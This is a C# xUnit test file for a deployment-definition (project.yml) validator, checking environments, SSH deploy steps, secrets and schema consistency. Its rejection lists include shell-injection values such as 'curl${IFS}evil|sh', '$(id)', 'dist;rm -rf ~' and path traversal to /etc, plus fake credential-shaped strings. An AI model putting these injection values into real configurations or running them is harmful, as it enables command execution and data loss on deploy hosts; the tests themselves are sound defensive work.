using System.Text.Json;
using AgentStudio.Projects;
using AgentStudio.TaskServer.Contracts;
using AgentStudio.TestSupport;
using Xunit;

namespace AgentStudio.Tests;

/// <summary>
/// project.yml schema 2 for stage P1 (AGT-3221): protected environments,
/// static-site and container steps over SSH with health checks, scoped
/// variables that name secrets, issue lines, schema 1 compatibility, and the
/// JSON schema staying in step with the validator.
/// </summary>
public sealed class ProjectDefinitionSchemaTwoTests
{
    private const string Head = """
        schemaVersion: 2
        stack: [node]
        toolVersions:
        commands:
          prepare: .agent-studio/prepare
          build: [npm run build]
          test: [npm test]
          lint: []
        testSuites:
        cachePaths: []
        capabilities: [git]
        environment:
        project:
          id: website
        """;

    private const string Pipeline = """

        artifacts:
          - name: site
            type: static
            path: dist
          - name: api
            type: container
            dockerfile: Dockerfile
            image: ghcr.io/agent-orc/api
        environments:
          - name: staging
            protected: false
          - name: production
            protected: true
        lifecycles:
          standard:
            - phase: staging
              automatic: true
            - phase: production
              approval: [Owner, Maintainer]
              requires: staging
        deploy:
          - step: static-site
            artifact: site
            target: web-vm
            directory: /srv/www/_staging/studio
            healthUrl: https://agent-orchestrator.dev/_staging/studio/
            healthTimeoutSeconds: 60
            environments: [staging]
          - step: container
            artifact: api
            target: run-host
            composeFile: /srv/apps/api/compose.yml
            service: api
            healthUrl: https://api.agent-orchestrator.dev/healthz
            healthTimeoutSeconds: 120
            environments: [production]
        variables:
          - name: LOG_LEVEL
            value: info
          - name: DATABASE_URL
            secret: DATABASE_URL
            environments: [production]
        """;

    private static string Valid => Head + Pipeline;

    [Theory]
    [InlineData("database-url")]
    [InlineData("database_url")]
    public void Environment_secret_names_that_share_a_container_variable_are_rejected(string second)
    {
        var yaml = Valid + "\n  - name: DATABASE_ALIAS\n    secret: " + second
            + "\n    environments: [production]\n";
        Assert.True(ProjectDefinitionReader.Parse(yaml).IsValid);
        Assert.Throws<JsonException>(() => ProjectEnvironmentService.ApplyDefinition([], yaml));
    }

    [Fact]
    public void Parses_channels_named_lifecycles_and_channel_scoped_variables()
    {
        var yaml = Head + """

            lifecycles:
              standard:
                - phase: staging
                  automatic: true
                - phase: production
                  approval: [Owner]
                  requires: staging
              hotfix:
                - phase: staging
                  automatic: true
                - phase: production
                  approval: [Owner]
            channels:
              - name: default
                lifecycle: standard
                default: true
              - name: hotfix
                lifecycle: hotfix
                versionRules:
                  branchPattern: refs/heads/hotfix/*
            variables:
              - name: LOG_LEVEL
                value: info
                channels: [hotfix]
            """;

        var result = ProjectDefinitionReader.Parse(yaml);
        Assert.True(result.IsValid, Describe(result));
        var deployment = result.Definition!.Deployment!;
        Assert.Equal("hotfix", deployment.Channels[1].Name);
        Assert.Equal("production", deployment.Lifecycles["hotfix"][1].Phase);
        Assert.Equal("hotfix", deployment.Variables[0].Channels.Single());
    }

    [Fact]
    public void Channels_require_one_default_and_declared_lifecycles()
    {
        var yaml = Head + """

            channels:
              - name: hotfix
                lifecycle: missing
                branchPattern: refs/heads/hotfix/*
            """;
        var issues = ProjectDefinitionReader.Parse(yaml).Issues;
        Assert.Contains(issues, issue => issue.Code == "channel-default-required");
        Assert.Contains(issues, issue => issue.Code == "channel-lifecycle-unknown");
    }

    [Fact]
    public void Parses_artifacts_protected_environments_ssh_steps_and_scoped_variables()
    {
        var result = ProjectDefinitionReader.Parse(Valid);

        Assert.True(result.IsValid, Describe(result));
        var deployment = result.Definition!.Deployment!;
        Assert.Equal(["staging", "production"], deployment.Environments.Select(environment => environment.Name));
        Assert.Equal([false, true], deployment.Environments.Select(environment => environment.Protected));
        Assert.Equal("ghcr.io/agent-orc/api", deployment.Artifacts[1].Image);
        var site = deployment.Deploy[0];
        Assert.Equal(("static-site", "web-vm", "/srv/www/_staging/studio", 60),
            (site.Step, site.Target, site.Directory, site.HealthTimeoutSeconds));
        var api = deployment.Deploy[1];
        Assert.Equal(("container", "/srv/apps/api/compose.yml", "api", "https://api.agent-orchestrator.dev/healthz"),
            (api.Step, api.ComposeFile, api.Service, api.HealthUrl));
        Assert.Equal(["LOG_LEVEL", "DATABASE_URL"], deployment.Variables.Select(variable => variable.Name));
        Assert.Equal("DATABASE_URL", deployment.Variables[1].Secret);
        Assert.Null(deployment.Variables[1].Value);
        Assert.False(deployment.EnvironmentsDefaulted);
        Assert.False(deployment.LifecycleDefaulted);
    }

    [Fact]
    public void Staging_and_protected_production_with_the_standard_lifecycle_are_the_default()
    {
        var withoutEnvironments = Cut(Cut(Valid, "environments:", "lifecycles:"), "lifecycles:", "deploy:");

        var result = ProjectDefinitionReader.Parse(withoutEnvironments);

        Assert.True(result.IsValid, Describe(result));
        var deployment = result.Definition!.Deployment!;
        Assert.True(deployment.EnvironmentsDefaulted);
        Assert.True(deployment.LifecycleDefaulted);
        Assert.Equal([("staging", false), ("production", true)],
            deployment.Environments.Select(environment => (environment.Name, environment.Protected)));
        Assert.Equal(["Owner", "Maintainer"], deployment.StandardLifecycle[1].Approval);
    }

    [Fact]
    public void Shorthand_environment_list_protects_production()
    {
        var shorthand = Cut(Valid, "environments:", "lifecycles:")
            .Replace("lifecycles:", "environments: [staging, production]\nlifecycles:", StringComparison.Ordinal);

        var result = ProjectDefinitionReader.Parse(shorthand);

        Assert.True(result.IsValid, Describe(result));
        Assert.Equal([false, true], result.Definition!.Deployment!.Environments.Select(environment => environment.Protected));
    }

    [Theory]
    [InlineData("    service: api\n", "    service: api\n    branch: deploy/api\n", "deploy[1].branch")]
    [InlineData("    directory: /srv/www/_staging/studio\n", "    directory: /srv/www/_staging/studio\n    composeFile: /srv/x.yml\n", "deploy[0].composeFile")]
    [InlineData("    protected: true\n", "    protected: true\n    region: eu\n", "environments[1].region")]
    [InlineData("    value: info\n", "    value: info\n    scope: global\n", "variables[0].scope")]
    [InlineData("    image: ghcr.io/agent-orc/api\n", "    image: ghcr.io/agent-orc/api\n    tag: latest\n", "artifacts[1].tag")]
    [InlineData("variables:\n", "releases:\n  - name: one\nvariables:\n", "releases")]
    public void Unknown_keys_are_refused_with_their_path(string before, string after, string path)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, before, after));

        Assert.False(result.IsValid);
        Assert.Contains(result.Issues, issue => issue.Code == "unknown-field" && issue.Path == path);
    }

    [Fact]
    public void Production_before_staging_is_refused_in_environments_and_in_the_lifecycle()
    {
        var environments = Replace(Valid,
            "  - name: staging\n    protected: false\n  - name: production\n    protected: true\n",
            "  - name: production\n    protected: true\n  - name: staging\n    protected: false\n");
        var lifecycle = Replace(Valid,
            "    - phase: staging\n      automatic: true\n    - phase: production\n      approval: [Owner, Maintainer]\n      requires: staging\n",
            "    - phase: production\n      approval: [Owner, Maintainer]\n      requires: staging\n    - phase: staging\n      automatic: true\n");

        Assert.Contains(ProjectDefinitionReader.Parse(environments).Issues,
            issue => issue.Code == "deployment-environment-order-invalid" && issue.Path == "environments");
        Assert.Contains(ProjectDefinitionReader.Parse(lifecycle).Issues,
            issue => issue.Code == "standard-lifecycle-invalid" && issue.Path == "lifecycles.standard");
    }

    [Fact]
    public void An_explicitly_empty_environment_list_is_refused()
    {
        var empty = Cut(Valid, "environments:", "lifecycles:")
            .Replace("lifecycles:", "environments:\nlifecycles:", StringComparison.Ordinal);

        Assert.Contains(ProjectDefinitionReader.Parse(empty).Issues, issue => issue.Code == "deployment-environments-invalid");
    }

    [Fact]
    public void Unprotected_production_is_refused()
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, "    protected: true\n", "    protected: false\n"));

        Assert.Contains(result.Issues, issue =>
            issue.Code == "production-protection-required" && issue.Path == "environments[1].protected");
    }

    [Fact]
    public void Protected_staging_is_refused()
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, "    protected: false\n", "    protected: true\n"));

        Assert.Contains(result.Issues, issue =>
            issue.Code == "staging-protection-unsupported" && issue.Path == "environments[0].protected");
    }

    /// <summary>Shell metacharacters, traversal, the filesystem root, and paths outside /srv.</summary>
    public static TheoryData<string> UnsafeRemotePaths() => new()
    {
        "/srv/x;curl${IFS}evil|sh", "/srv/$(id)", "/srv/`id`", "/srv/x&&reboot", "/srv/x>y", "/srv/x y",
        "/srv/a*", "/srv/~root", "/srv/x\\y", "//", "/.", "/", "/srv", "/srv/", "/srv/.", "/srv/..",
        "/srv/../etc", "/srv/www/../../etc", "/srv/./www", "/srv//www", "/srv/-rf", "/etc/nginx", "/srvx/www", "srv/www",
    };

    [Theory]
    [MemberData(nameof(UnsafeRemotePaths))]
    public void Static_site_directory_refuses_unsafe_paths(string directory)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid,
            "    directory: /srv/www/_staging/studio\n", $"    directory: \"{directory}\"\n"));

        Assert.Contains(result.Issues, issue => issue.Code == "deploy-directory-invalid" && issue.Path == "deploy[0].directory");
    }

    /// <summary>The same classes of unsafe path, each with a compose suffix that must not rescue it.</summary>
    public static TheoryData<string> UnsafeComposeFiles() => new()
    {
        "/srv/x;curl${IFS}evil|sh.yml", "/srv/$(id).yml", "/srv/`id`/compose.yml", "/srv/x&&reboot.yml", "/srv/x y/compose.yml",
        "//compose.yml", "/./compose.yml", "/compose.yml", "/srv/./compose.yml", "/srv/../compose.yml",
        "/srv/../etc/compose.yml", "/srv//compose.yml", "/srv/-f.yml", "/etc/compose.yml", "/srvx/compose.yml",
        "srv/compose.yml", "/srv/apps/api/compose.json", "/srv/apps/api/compose.yml;id", "/srv/apps/api/compose.yml/..",
    };

    [Theory]
    [MemberData(nameof(UnsafeComposeFiles))]
    public void Container_compose_file_refuses_unsafe_paths(string composeFile)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid,
            "    composeFile: /srv/apps/api/compose.yml\n", $"    composeFile: \"{composeFile}\"\n"));

        Assert.Contains(result.Issues, issue => issue.Code == "deploy-compose-file-invalid" && issue.Path == "deploy[1].composeFile");
    }

    [Theory]
    [InlineData("/srv/site")]
    [InlineData("/srv/www/_staging/studio")]
    [InlineData("/srv/a.b/c-d_e/.well-known")]
    public void Remote_paths_below_srv_with_plain_segments_are_accepted(string directory)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid,
            "    directory: /srv/www/_staging/studio\n", $"    directory: {directory}\n"));

        Assert.True(result.IsValid, Describe(result));
    }

    public static TheoryData<string> UnsafeArtifactPaths() => new()
    {
        "dist;rm -rf ~", "$(id)", "`id`", "dist|sh", "dist&&x", "dist x", "../dist", "dist/../..", "dist/./x", "./dist",
        "..", "/dist", "~/dist", "-rf", "dist/-x", "dist//x", "dist\\x", "dist*",
    };

    [Theory]
    [MemberData(nameof(UnsafeArtifactPaths))]
    public void Artifact_path_fields_refuse_unsafe_paths(string path)
    {
        var bundle = ProjectDefinitionReader.Parse(Replace(Valid, "    path: dist\n", $"    path: \"{path}\"\n"));
        var dockerfile = ProjectDefinitionReader.Parse(Replace(Valid, "    dockerfile: Dockerfile\n", $"    dockerfile: \"{path}\"\n"));
        var context = ProjectDefinitionReader.Parse(Replace(Valid,
            "    dockerfile: Dockerfile\n", $"    dockerfile: Dockerfile\n    path: \"{path}\"\n"));

        Assert.Contains(bundle.Issues, issue => issue.Code == "artifact-path-invalid" && issue.Path == "artifacts[0].path");
        Assert.Contains(dockerfile.Issues, issue => issue.Code == "artifact-dockerfile-invalid" && issue.Path == "artifacts[1].dockerfile");
        Assert.Contains(context.Issues, issue => issue.Code == "artifact-path-invalid" && issue.Path == "artifacts[1].path");
    }

    [Fact]
    public void Artifact_paths_accept_hidden_directories_and_the_repository_root_as_build_context()
    {
        var yaml = Replace(Replace(Valid, "    path: dist\n", "    path: .output/public\n"),
            "    dockerfile: Dockerfile\n", "    dockerfile: docker/Dockerfile.prod\n    path: .\n");

        var result = ProjectDefinitionReader.Parse(yaml);

        Assert.True(result.IsValid, Describe(result));
    }

    [Theory]
    [InlineData("    target: web-vm\n", "    target: \"web-vm;id\"\n", "deploy[0].target", "deploy-target-invalid")]
    [InlineData("    target: run-host\n", "    target: \"$(id)\"\n", "deploy[1].target", "deploy-target-invalid")]
    [InlineData("    service: api\n", "    service: \"api;reboot\"\n", "deploy[1].service", "deploy-service-invalid")]
    [InlineData("    service: api\n", "    service: \"-api\"\n", "deploy[1].service", "deploy-service-invalid")]
    public void Ssh_step_names_refuse_shell_metacharacters(string before, string after, string path, string code)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, before, after));

        Assert.Contains(result.Issues, issue => issue.Code == code && issue.Path == path);
    }

    private static readonly ProjectDeployHostRegistry RegisteredHosts = new(new Dictionary<string, IReadOnlyList<string>>
    {
        ["staging"] = ["web-vm"],
        ["production"] = ["run-host", "web-vm"],
    });

    [Fact]
    public void Targets_registered_for_their_environments_are_accepted()
    {
        var result = ProjectDefinitionReader.Parse(Valid, hosts: RegisteredHosts);

        Assert.True(result.IsValid, Describe(result));
    }

    [Fact]
    public void A_target_not_registered_for_its_environment_is_refused_on_its_line()
    {
        var yaml = Replace(Valid, "    target: web-vm\n", "    target: run-host\n");

        var result = ProjectDefinitionReader.Parse(yaml, hosts: RegisteredHosts);

        var issue = Assert.Single(result.Issues);
        Assert.Equal(("deploy-target-unregistered", "deploy[0].target"), (issue.Code, issue.Path));
        Assert.Equal(LineOf(yaml, "    target: run-host"), issue.Line);
        Assert.Contains("staging: web-vm", issue.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void A_step_for_every_environment_needs_its_target_registered_for_each()
    {
        var unscoped = Replace(Valid, "    healthTimeoutSeconds: 120\n    environments: [production]\n", "    healthTimeoutSeconds: 120\n");

        var result = ProjectDefinitionReader.Parse(unscoped, hosts: RegisteredHosts);
        var shapeOnly = ProjectDefinitionReader.Parse(unscoped);

        var issue = Assert.Single(result.Issues);
        Assert.Equal(("deploy-target-unregistered", "deploy[1].target"), (issue.Code, issue.Path));
        Assert.Contains("registered for staging (", issue.Message, StringComparison.Ordinal);
        Assert.True(shapeOnly.IsValid, Describe(shapeOnly));
    }

    [Fact]
    public void Without_registered_hosts_every_target_is_refused()
    {
        var empty = new ProjectDeployHostRegistry(new Dictionary<string, IReadOnlyList<string>>());

        var result = ProjectDefinitionReader.Parse(Valid, hosts: empty);

        Assert.Equal(["deploy[0].target", "deploy[1].target"],
            result.Issues.Where(issue => issue.Code == "deploy-target-unregistered").Select(issue => issue.Path));
    }

    public static TheoryData<string, string> InlineSecrets() => new()
    {
        // Credential-shaped values are assembled at runtime (AGENTS.md fixture rule).
        { "API_TOKEN", "abc" + "123" },
        { "SMTP_PASSWORD", "hunter" + "2" },
        { "DB_PASS", "hunter" + "2" },
        { "STRIPE_KEY", "abc" + "123" },
        { "SECRET_KEY_BASE", "abc" + "123" },
        { "dbPassword", "hunter" + "2" },
        { "GITHUBAUTHTOKEN", "abc" + "123" },
        { "SQL_CONNECTION_STRING", "Server=db;Database=app" },
        { "DATABASE_URL", "postgres://app:" + "pw" + "@db.internal/app" },
        { "WEBHOOK_URL", "https://hooks.example.test/notify?channel=ops&" + "token=" + "abc123" },
        { "REPORT_URL", "https://example.test/report?" + "api_key=" + "abc123" },
        { "SQL_SERVER", "Server=db;User Id=app;" + "Password=" + "pw" },
        { "SIGNING_MATERIAL", "-----BEGIN " + "PRIVATE KEY-----" },
        { "UPSTREAM_AUTH", "Bearer " + "abc.def" },
        { "UPSTREAM_BASIC", "Basic " + Convert.ToBase64String("app:pw-value"u8.ToArray()) },
        { "SESSION", "eyJ" + "hbGciOiJIUzI1NiJ9" + ".eyJ" + "zdWIiOiIxIn0" + ".sig" },
        { "PAYMENTS", "sk_" + "live_" + new string('a', 24) },
        { "CI_ACCESS", "gh" + "p_" + new string('b', 36) },
        { "CLOUD_ACCESS_ID", "AK" + "IA" + new string('C', 16) },
    };

    [Theory]
    [MemberData(nameof(InlineSecrets))]
    public void Inline_secret_values_are_refused(string name, string value)
    {
        var yaml = Replace(Valid, "  - name: LOG_LEVEL\n    value: info\n", $"  - name: {name}\n    value: \"{value}\"\n");

        var result = ProjectDefinitionReader.Parse(yaml);

        Assert.Contains(result.Issues, issue => issue.Code == "secret-value-inline" && issue.Path == "variables[0].value");
        Assert.DoesNotContain(result.Issues, issue => issue.Message.Contains(value, StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("TOKEN_TTL", "3600")]
    [InlineData("PASSWORD_MIN_LENGTH", "12")]
    [InlineData("KEYBOARD_LAYOUT", "de")]
    [InlineData("STRIPE_PUBLISHABLE_KEY", "pk-demo")]
    [InlineData("CACHE_KEY", "v1")]
    [InlineData("BYPASS_CACHE", "true")]
    [InlineData("PLAN_NAME", "Basic tier")]
    [InlineData("PUBLIC_URL", "https://example.test/docs?page=2&keyword=deploy")]
    public void Plain_configuration_under_harmless_names_is_accepted(string name, string value)
    {
        var yaml = Replace(Valid, "  - name: LOG_LEVEL\n    value: info\n", $"  - name: {name}\n    value: \"{value}\"\n");

        var result = ProjectDefinitionReader.Parse(yaml);

        Assert.True(result.IsValid, Describe(result));
    }

    [Theory]
    [InlineData("    secret: DATABASE_URL\n", "    secret: \"postgres://db/app\"\n", "variable-secret-name-invalid")]
    [InlineData("    secret: DATABASE_URL\n", "    secret: DATABASE_URL\n    value: x\n", "variable-source-invalid")]
    [InlineData("    secret: DATABASE_URL\n    environments: [production]", "    secret: DATABASE_URL\n    environments: [preview]", "variable-environment-unknown")]
    [InlineData("  - name: DATABASE_URL\n    secret: DATABASE_URL\n    environments: [production]", "  - name: LOG_LEVEL\n    secret: DATABASE_URL", "variable-duplicate")]
    public void Variable_rules_name_the_offending_entry(string before, string after, string code)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, before, after));

        Assert.Contains(result.Issues, issue => issue.Code == code && issue.Path.StartsWith("variables[1]", StringComparison.Ordinal));
    }

    [Fact]
    public void Equally_specific_overlapping_variable_scopes_are_refused()
    {
        var yaml = Replace(Replace(Valid, "  - name: LOG_LEVEL\n    value: info\n",
            "  - name: LOG_LEVEL\n    value: info\n    environments: [production]\n"),
            "  - name: DATABASE_URL\n", "  - name: LOG_LEVEL\n");

        Assert.Contains(ProjectDefinitionReader.Parse(yaml).Issues,
            issue => issue.Code == "variable-duplicate" && issue.Path == "variables[1].name");
    }

    [Theory]
    [InlineData("    healthUrl: https://api.agent-orchestrator.dev/healthz\n", "", "deploy[1].healthUrl", "deploy-health-url-invalid")]
    [InlineData("    healthTimeoutSeconds: 120\n", "    healthTimeoutSeconds: 0\n", "deploy[1].healthTimeoutSeconds", "deploy-health-timeout-invalid")]
    [InlineData("    healthTimeoutSeconds: 120\n", "    healthTimeoutSeconds: 901\n", "deploy[1].healthTimeoutSeconds", "deploy-health-timeout-invalid")]
    [InlineData("    healthTimeoutSeconds: 60\n", "    healthTimeoutSeconds: soon\n", "deploy[0].healthTimeoutSeconds", "deploy-health-timeout-invalid")]
    [InlineData("    directory: /srv/www/_staging/studio\n", "    directory: srv/www\n", "deploy[0].directory", "deploy-directory-invalid")]
    [InlineData("    directory: /srv/www/_staging/studio\n", "    directory: /srv/../etc\n", "deploy[0].directory", "deploy-directory-invalid")]
    [InlineData("    composeFile: /srv/apps/api/compose.yml\n", "    composeFile: /srv/apps/api/compose.json\n", "deploy[1].composeFile", "deploy-compose-file-invalid")]
    [InlineData("    target: run-host\n", "    target: deploy@run-host\n", "deploy[1].target", "deploy-target-invalid")]
    [InlineData("    artifact: api\n", "    artifact: site\n", "deploy[1].artifact", "deploy-container-artifact-required")]
    public void Ssh_steps_need_target_destination_and_health_check(string before, string after, string path, string code)
    {
        var result = ProjectDefinitionReader.Parse(Replace(Valid, before, after));

        Assert.Contains(result.Issues, issue => issue.Code == code && issue.Path == path);
    }

    [Fact]
    public void Issues_carry_the_line_of_their_path()
    {
        var yaml = Replace(Valid, "    healthTimeoutSeconds: 120\n", "    healthTimeoutSeconds: 0\n")
            .Replace("    protected: true\n", "    protected: true\n    region: eu\n", StringComparison.Ordinal);

        var result = ProjectDefinitionReader.Parse(yaml);

        var timeout = Assert.Single(result.Issues, issue => issue.Path == "deploy[1].healthTimeoutSeconds");
        Assert.Equal(LineOf(yaml, "    healthTimeoutSeconds: 0"), timeout.Line);
        var unknown = Assert.Single(result.Issues, issue => issue.Path == "environments[1].region");
        Assert.Equal(LineOf(yaml, "    region: eu"), unknown.Line);
    }

    [Fact]
    public void Issue_for_a_missing_field_points_at_its_entry_and_a_tab_at_its_own_line()
    {
        var yaml = Replace(Valid, "    service: api\n", string.Empty) + "\tbroken: true\n";

        var result = ProjectDefinitionReader.Parse(yaml);

        var service = Assert.Single(result.Issues, issue => issue.Path == "deploy[1].service");
        Assert.Equal(LineOf(yaml, "  - step: container"), service.Line);
        var tab = Assert.Single(result.Issues, issue => issue.Code == "yaml-tab");
        Assert.Equal(yaml.Split('\n').Length - 1, tab.Line);
    }

    [Fact]
    public void Schema_one_keeps_working_and_refuses_the_schema_two_sections()
    {
        var schemaOne = Head.Replace("schemaVersion: 2", "schemaVersion: 1", StringComparison.Ordinal)
            .Replace("project:\n  id: website", string.Empty, StringComparison.Ordinal);

        var legacy = ProjectDefinitionReader.Parse(schemaOne);
        var mixed = ProjectDefinitionReader.Parse(schemaOne + "variables:\n  - name: LOG_LEVEL\n    value: info\n");

        Assert.True(legacy.IsValid, Describe(legacy));
        Assert.Null(legacy.Definition!.Deployment);
        Assert.Contains(mixed.Issues, issue => issue.Code == "v1-does-not-support-deployment");
    }

    [Fact]
    public void The_repository_schema_one_definition_stays_valid()
    {
        var root = RepositoryRoot.Find();

        var result = ProjectDefinitionReader.ReadWorkspace(root);

        Assert.True(result.IsValid, Describe(result));
        Assert.Equal(1, result.Definition!.SchemaVersion);
    }

    [Fact]
    public void Json_schema_declares_the_validator_vocabulary()
    {
        using var schema = JsonDocument.Parse(File.ReadAllText(
            Path.Combine(RepositoryRoot.Find(), "docs", "app", "schemas", "project-execution.schema.json")));
        var properties = schema.RootElement.GetProperty("properties");

        foreach (var section in ProjectDeploymentVocabulary.Sections)
            Assert.True(properties.TryGetProperty(section, out _), $"schema lacks '{section}'");
        var deployItem = properties.GetProperty("deploy").GetProperty("items");
        Assert.Equal(ProjectDeploymentVocabulary.StepKinds,
            deployItem.GetProperty("properties").GetProperty("step").GetProperty("enum").EnumerateArray().Select(item => item.GetString()));
        foreach (var kind in new[] { "static-site", "container" })
        {
            var rule = deployItem.GetProperty("allOf").EnumerateArray().Single(entry =>
                entry.GetProperty("if").GetProperty("properties").GetProperty("step").TryGetProperty("const", out var value)
                && value.GetString() == kind);
            var names = rule.GetProperty("then").GetProperty("allOf")[1].GetProperty("propertyNames").GetProperty("enum");
            Assert.Equal(ProjectDeploymentVocabulary.StepKeys(kind), names.EnumerateArray().Select(item => item.GetString()));
        }
        Assert.Equal(ProjectDeploymentVocabulary.ArtifactTypes,
            properties.GetProperty("artifacts").GetProperty("items").GetProperty("oneOf").EnumerateArray()
                .Select(item => item.GetProperty("properties").GetProperty("type").GetProperty("const").GetString()));
        Assert.Equal(ProjectDeploymentVocabulary.VariableKeys,
            properties.GetProperty("variables").GetProperty("items").GetProperty("properties").EnumerateObject().Select(item => item.Name));
        Assert.Equal(ProjectDeploymentVocabulary.TenantKeys,
            properties.GetProperty("tenants").GetProperty("items").GetProperty("properties").EnumerateObject().Select(item => item.Name));
        Assert.Equal(ProjectDeploymentVocabulary.ChannelKeys,
            properties.GetProperty("channels").GetProperty("items").GetProperty("properties").EnumerateObject().Select(item => item.Name));
    }

    [Fact]
    public void Tenant_scopes_use_or_within_a_kind_and_and_across_kinds()
    {
        var yaml = Valid + "\n" + """
            tenants:
              - name: acme
                tags: [premium, europe]
                environments: [staging, production]
              - name: beta
                tags: [europe]
                environments: [staging]
            """;
        // The parsed definition and the pure resolver share the same tenant vocabulary.
        var parsed = ProjectDefinitionReader.Parse(yaml);
        Assert.True(parsed.IsValid, Describe(parsed));
        var tenants = parsed.Definition!.Deployment!.Tenants;
        Assert.Equal(["acme", "beta"], tenants.Select(item => item.Name));
        var variables = new[]
        {
            new ProjectVariableDefinition("MODE", "base", null, []),
            new ProjectVariableDefinition("MODE", "europe", null, []) { TenantTags = ["premium", "europe"] },
            new ProjectVariableDefinition("MODE", "acme-prod", null, ["production"]) { Tenants = ["acme"] },
        };
        Assert.Equal("acme-prod", ProjectVariableResolution.Resolve(variables, "MODE", "production", tenants[0])?.Value);
        Assert.Equal("europe", ProjectVariableResolution.Resolve(variables, "MODE", "staging", tenants[0])?.Value);
        Assert.Equal("europe", ProjectVariableResolution.Resolve(variables, "MODE", "staging", tenants[1])?.Value);
        Assert.Equal("base", ProjectVariableResolution.Resolve(variables, "MODE", "production", null)?.Value);
        var scoped = ProjectDefinitionReader.Parse(Head + """

            tenants:
              - name: acme
                tags: [premium]
                environments: [staging, production]
            variables:
              - name: MODE
                value: base
              - name: MODE
                value: premium
                tenants: [acme]
                tenantTags: [premium]
            """);
        Assert.True(scoped.IsValid, Describe(scoped));
        Assert.Equal(["acme"], scoped.Definition!.Deployment!.Variables[1].Tenants);
    }

    [Theory]
    [InlineData("tenants:\n  - name: acme\n    environments: [preview]\n", "tenant-environments-invalid")]
    [InlineData("tenants:\n  - name: acme\n    environments: [staging]\n  - name: acme\n    environments: [staging]\n", "tenant-name-invalid")]
    [InlineData("variables:\n  - name: MODE\n    value: x\n    tenants: [missing]\n", "variable-tenant-unknown")]
    public void Invalid_tenant_declarations_have_field_issues(string section, string code)
    {
        var result = ProjectDefinitionReader.Parse(Head + "\n" + section);
        Assert.Contains(result.Issues, issue => issue.Code == code && !string.IsNullOrWhiteSpace(issue.Path));
    }

    [Fact]
    public void Json_schema_uses_the_validator_patterns()
    {
        using var schema = JsonDocument.Parse(File.ReadAllText(
            Path.Combine(RepositoryRoot.Find(), "docs", "app", "schemas", "project-execution.schema.json")));
        var root = schema.RootElement;
        var definitions = root.GetProperty("$defs");
        string Pattern(JsonElement element) => element.GetProperty("pattern").GetString()!;
        string Reference(JsonElement element) => element.GetProperty("$ref").GetString()!;

        Assert.Equal(ProjectDeploymentVocabulary.RemotePathPattern, Pattern(definitions.GetProperty("remotePath")));
        Assert.Equal(ProjectDeploymentVocabulary.ArtifactPathPattern, Pattern(definitions.GetProperty("artifactPath")));
        Assert.Equal(ProjectDeploymentVocabulary.IdentifierPattern, Pattern(definitions.GetProperty("identifier")));

        var step = root.GetProperty("properties").GetProperty("deploy").GetProperty("items").GetProperty("properties");
        Assert.Equal("#/$defs/remotePath", Reference(step.GetProperty("directory")));
        var compose = step.GetProperty("composeFile").GetProperty("allOf");
        Assert.Equal("#/$defs/remotePath", Reference(compose[0]));
        Assert.Equal(ProjectDeploymentVocabulary.ComposeFilePattern, Pattern(compose[1]));
        Assert.Equal("#/$defs/identifier", Reference(step.GetProperty("service")));

        var artifacts = root.GetProperty("properties").GetProperty("artifacts").GetProperty("items").GetProperty("oneOf");
        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[0].GetProperty("properties").GetProperty("path")));
        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[1].GetProperty("properties").GetProperty("dockerfile")));
        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[1].GetProperty("properties").GetProperty("path")));

        Assert.Equal(ProjectDeploymentVocabulary.SecretReferencePattern,
            Pattern(root.GetProperty("properties").GetProperty("variables").GetProperty("items").GetProperty("properties").GetProperty("secret")));
        var staging = root.GetProperty("properties").GetProperty("environments").GetProperty("oneOf")[1].GetProperty("prefixItems")[0];
        Assert.False(staging.GetProperty("properties").GetProperty("protected").GetProperty("const").GetBoolean());
    }

    private static string Replace(string text, string before, string after)
    {
        Assert.Contains(before, text, StringComparison.Ordinal);
        return text.Replace(before, after, StringComparison.Ordinal);
    }

    /// <summary>Removes the section that starts at <paramref name="from"/> up to <paramref name="to"/>.</summary>
    private static string Cut(string text, string from, string to)
    {
        var start = text.IndexOf("\n" + from, StringComparison.Ordinal) + 1;
        var end = text.IndexOf("\n" + to, start, StringComparison.Ordinal) + 1;
        Assert.True(start > 0 && end > start);
        return text[..start] + text[end..];
    }

    private static int LineOf(string yaml, string line)
        => Array.IndexOf(yaml.Split('\n'), line) + 1;

    private static string Describe(ProjectDefinitionReadResult result)
        => string.Join("; ", result.Issues.Select(issue => $"{issue.Path} {issue.Code} {issue.Message}"));
}
